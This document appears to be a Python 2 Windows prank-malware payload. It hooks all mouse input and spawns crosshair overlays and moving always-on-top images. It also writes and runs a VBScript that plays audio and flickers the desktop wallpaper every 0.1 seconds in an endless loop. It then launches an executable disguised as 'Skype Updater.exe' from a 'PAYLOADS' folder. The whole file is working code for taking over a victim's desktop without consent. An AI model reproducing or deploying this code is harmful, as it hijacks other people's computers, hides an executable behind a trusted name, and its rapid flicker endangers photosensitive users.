import pyHook, pythoncom, thread, Tkinter, getpass
import winsound, random, time, ctypes, os

class Rekt:

    def __init__(self):
        # These variables will be used later on
        self.counter = 0
        self.kk = 1
        self.ops = 0
        self.dir = 'C:\Users\%s\Links\MEDIA\\' % getpass.getuser()

        # This will run the "mouse_hook" function continuously as a thread
        thread.start_new_thread(self.mouse_hook,())
        while True:
            pass


    def mouse_hook(self):

        def on_click(event):
            ''' The "event.Message" here stored enables us to know whether
            the left mouse button is being pressed or not >> cross_hair spawning '''
            self.e_m = event.Message

            # The mouse position will be stored as a tuple >> cross_hair spawning
            self.e_p_x, self.e_p_y = event.Position

            try:
                # 514 is the code for "left mouse button up"
                if self.e_m == 514 and self.counter != 11:
                    # -50 turned out to be the perfect value for the cross_hair to be centralized
                    self.cross_hair(self.e_p_x - 50, self.e_p_y - 50)
                    self.counter += 1

                elif self.e_m == 514 and self.counter >= 11:
                    # This makes the Tkinter widget to run only once
                    self.ops += 1

                    self.starter()

                    # This will play a MLG audio sample in the background
                    tracks = ['shot.wav', 'horn.wav']
                    winsound.PlaySound(self.dir + 'AUDIO\%s' % random.choice(tracks), winsound.SND_ASYNC)

            except:
                pass

            return True

        hm = pyHook.HookManager()
        hm.MouseAll = on_click
        hm.HookMouse()
        pythoncom.PumpMessages()


    def cross_hair(self, x , y):
        self.root = Tkinter.Tk()

        # The parameters x and y correspond to the mouse position
        self.root.geometry("100x100+%s+%s" % (str(x),str(y)))

        # This should make the widget borderless and transparent
        self.root.configure(background='snow')
        self.root.overrideredirect(True)
        self.root.attributes("-topmost", True)
        self.root.wm_attributes("-transparentcolor", "snow")

        # Cross_hair image
        self.a = Tkinter.PhotoImage(file = self.dir + 'MLG\\hit_1.gif')
        self.img = Tkinter.Label(self.root, background = 'snow', image = self.a)
        self.img.pack(anchor = 'center')

        def sound():
            # Hit sound
            winsound.PlaySound(self.dir + 'AUDIO\\hit.wav', winsound.SND_ASYNC)
            self.root.destroy()


        self.root.after(175, sound)
        self.root.mainloop()


    def starter(self):

        # The "sound.vbs" script will play a dubstep sample in the background
        self.soundbgcode = '''Set Sound = CreateObject("WMPlayer.OCX.7")
        Sound.URL = "%sAUDIO\\il.wav"
        Sound.Controls.play
        do while Sound.currentmedia.duration = 0
        wscript.sleep 100
        loop
        wscript.sleep (int(Sound.currentmedia.duration)+1)*1000
        ''' % (self.dir)

        self.sbgcodew = open(self.dir +"OTHER\\sound.vbs", 'w')
        self.sbgcodew.write(self.soundbgcode)
        self.sbgcodew.close()
        os.system('start %sOTHER\\sound.vbs' % self.dir)

        if self.ops == 1:
            thread.start_new_thread(self.wallpaper, ())
            self.main_image_window()

            # The TEXT payload
            try:
                os.system('\"C:\Users\%s\Saved Games\PAYLOADS\AUDIO_VISUAL\MLG\\Skype Updater.exe\"'
                          % getpass.getuser())
            except:
                pass


    def main_image_window(self):
        self.a_list = [300, 400, 200, 800, 900, 1000]

        self.rt = Tkinter.Tk()
        self.rt.configure(background='snow')
        self.rt.overrideredirect(True)
        self.rt.attributes("-topmost", True)
        self.rt.wm_attributes("-transparentcolor", "snow")

        self.mlgs = ['doge', 'dor_2','horn','mount','weed']
        self.a1 = Tkinter.PhotoImage(file=self.dir + 'MLG\\%s' % random.choice(self.mlgs) + '.gif' )
        self.img1 = Tkinter.Label(self.rt, background='snow', image=self.a1)
        self.img1.pack(anchor='center')

        self.x = random.choice(self.a_list)
        self.y = random.choice(self.a_list)
        self.p = random.choice([0, 1])

        # This function will force the widget to move repetitively
        def rand_movement():

            def choice_a():
                self.rt.geometry('200x200+%s+%s' % (self.x, self.kk * 100))
            def choice_b():
                self.rt.geometry('200x200+%s+%s' % (self.kk * 100,self.y))

            if self.kk * 100 <= int(ctypes.windll.user32.GetSystemMetrics(0)):
                if self.p == 0:
                    choice_a()
                else:
                    choice_b()

            else:
                 self.kk = 1
                 # The widget's position is restarted in here
                 if self.p == 0:
                    self.rt.geometry('200x200+%s+%s' % (self.x, self.kk * 100))
                 else:
                     self.rt.geometry('200x200+%s+%s' % (self.kk * 100, self.y))


            self.kk += 1
            self.rt.after(75, rand_movement)

        rand_movement()
        self.rt.mainloop()

    def wallpaper(self):
        # The wallpaper function will constantly change the wallpaper, creating a flickering effect
        while True:
            for po in range(3):
                a_wallpaper = ['1.gif', '2.gif', '3.gif']
                try:
                    ctypes.windll.user32.SystemParametersInfoA(20, 0,self.dir + 'COLORS\\' + a_wallpaper[po], 0)
                except:
                    po = 0

                time.sleep(0.1)


zz = Rekt()

